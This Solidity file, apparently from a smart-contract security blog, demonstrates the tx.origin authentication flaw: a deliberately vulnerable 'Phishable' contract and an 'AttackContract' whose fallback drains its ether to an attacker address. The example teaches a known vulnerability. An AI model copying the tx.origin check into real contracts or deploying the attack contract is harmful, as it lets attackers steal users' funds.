// From https://github.com/sigp/solidity-security-blog
// Tx.Origin Authentication

pragma solidity ^0.5.0;

contract Phishable {
    address public owner;

    constructor(address _owner) public {
        owner = _owner;
    }

    function() external payable {} // collect ether

    function withdrawAll(address payable _recipient) external {
        // use msg.sender
        require(tx.origin == owner);
        _recipient.transfer(address(this).balance);
    }
}

contract AttackContract {
    Phishable phishableContract;
    address payable attacker; // The attackers address to receive funds.

    constructor(Phishable _phishableContract, address payable _attackerAddress)
        public
    {
        phishableContract = _phishableContract;
        attacker = _attackerAddress;
    }

    function() external payable {
        phishableContract.withdrawAll(attacker);
    }
}
